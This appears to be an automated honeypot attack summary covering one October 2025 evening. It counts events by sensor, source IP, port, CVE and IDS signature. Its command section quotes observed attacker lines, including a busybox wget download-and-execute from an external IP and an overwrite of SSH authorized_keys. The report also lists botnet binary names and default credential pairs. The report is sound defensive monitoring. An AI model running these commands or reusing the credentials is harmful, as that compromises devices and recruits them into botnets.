
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-13T21:01:35Z
**Timeframe of Logs:** Approximately 2025-10-13T20:20:01Z to 2025-10-13T21:00:01Z
**Log Files Processed:**
- `agg_log_20251013T202001Z.json`
- `agg_log_20251013T204001Z.json`
- `agg_log_20251013T210001Z.json`

---

## Executive Summary

This report summarizes 17,294 malicious events captured by the honeypot network. The majority of attacks were captured by the Cowrie honeypot, indicating a high volume of SSH and Telnet brute-force attempts and command-line activity. A significant number of events were also logged by Sentrypeer and Suricata, highlighting active VoIP scanning and network-level exploits respectively. Attackers predominantly targeted port 5060 (SIP) and port 22 (SSH). A notable amount of activity involved attempts to exploit the DoublePulsar backdoor. Reconnaissance and payload delivery commands were common, with attackers attempting to download and execute various malware binaries.

---

## Detailed Analysis

### Attacks by Honeypot
- **Cowrie:** 9966
- **Sentrypeer:** 3180
- **Suricata:** 3012
- **Honeytrap:** 828
- **Tanner:** 98
- **Dionaea:** 64
- **H0neytr4p:** 37
- **Mailoney:** 30
- **Honeyaml:** 26
- **Redishoneypot:** 18
- **ElasticPot:** 7
- **ConPot:** 7
- **Adbhoney:** 6
- **Dicompot:** 4
- **Miniprint:** 8
- **Ipphoney:** 1

### Top Attacking IPs
- **202.120.234.140:** 1590
- **185.243.5.146:** 1141
- **134.199.201.107:** 916
- **47.86.37.20:** 862
- **45.236.188.4:** 858
- **196.251.88.103:** 1006
- **8.137.163.240:** 508
- **83.97.24.41:** 426
- **172.86.95.98:** 426
- **172.86.95.115:** 420

### Top Targeted Ports/Protocols
- **5060:** 3180
- **TCP/445:** 1585
- **22:** 1505
- **23:** 69
- **80:** 108
- **TCP/22:** 83
- **UDP/5060:** 92
- **443:** 37
- **TCP/1080:** 25
- **25:** 26
- **135:** 18

### Most Common CVEs
- CVE-2022-27255
- CVE-2006-0189
- CVE-2005-4050
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2021-3449
- CVE-2024-4577
- CVE-2002-0953
- CVE-2019-11500
- CVE-2021-41773
- CVE-2021-42013
- CVE-2016-20016
- CVE-2023-26801
- CVE-2019-12263
- CVE-2019-12261
- CVE-2019-12260
- CVE-2019-12255
- CVE-1999-0183
- CVE-2018-10562
- CVE-2018-10561
- CVE-2001-0414

### Commands Attempted by Attackers
- **System Reconnaissance:** `whoami`, `uname -a`, `lscpu`, `cat /proc/cpuinfo`, `free -m`, `w`, `crontab -l`
- **Payload Download/Execution:** `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/[payload]; ...`
- **SSH Key Manipulation:** `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`
- **File Manipulation:** `chattr -ia .ssh`, `lockr -ia .ssh`
- **Password Change:** `Enter new UNIX password:`

### Signatures Triggered
- **ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication:** 1583
- **ET DROP Dshield Block Listed Source group 1:** 403
- **ET SCAN NMAP -sS window 1024:** 159
- **ET INFO Reserved Internal IP Traffic:** 58
- **ET SCAN Potential SSH Scan:** 60
- **ET VOIP Modified Sipvicious Asterisk PBX User-Agent:** 38

### Users / Login Attempts
- **345gs5662d34/345gs5662d34:** 35
- **root/[multiple passwords]:** High volume
- **guest/[multiple passwords]:** Moderate volume
- **nobody/22:** 6
- **test/777777:** 6
- **supervisor/supervisor999:** 6
- **config/[multiple passwords]:** Moderate volume

### Files Uploaded/Downloaded
- `sh`
- `Mozi.a+jaws`
- `arm.urbotnetisass`
- `arm5.urbotnetisass`
- `arm6.urbotnetisass`
- `arm7.urbotnetisass`
- `x86_32.urbotnetisass`
- `mips.urbotnetisass`
- `mipsel.urbotnetisass`
- `ohshit.sh;`
- `policy.html`
- `gpon80&ipv=0`

### HTTP User-Agents
- No significant HTTP user-agents were logged in this period.

### SSH Clients and Servers
- No specific SSH client or server versions were logged in this period.

### Top Attacker AS Organizations
- No AS organization data was available in the logs for this period.

---

## Key Observations and Anomalies

- **Dominance of Automated Attacks:** The repetitive nature of commands, login attempts, and exploitation of known vulnerabilities (like DoublePulsar) strongly indicates automated scanning and infection campaigns.
- **VoIP Scanning:** The high number of events on port 5060 from the Sentrypeer honeypot suggests widespread scanning for vulnerabilities in VoIP systems.
- **Malware Delivery:** Attackers consistently attempted to download and execute shell scripts and ELF binaries (e.g., `urbotnetisass`, `Mozi`), common tactics for recruiting devices into botnets.
- **Credential Stuffing:** A wide variety of username and password combinations were attempted, targeting common default credentials for IoT devices and servers. The pair `345gs5662d34/345gs5662d34` was unusually common.
- **Focus on Evasion:** The use of commands like `rm -rf /tmp/secure.sh` and `pkill` indicates an awareness of other malware and a desire to control the compromised system exclusively.
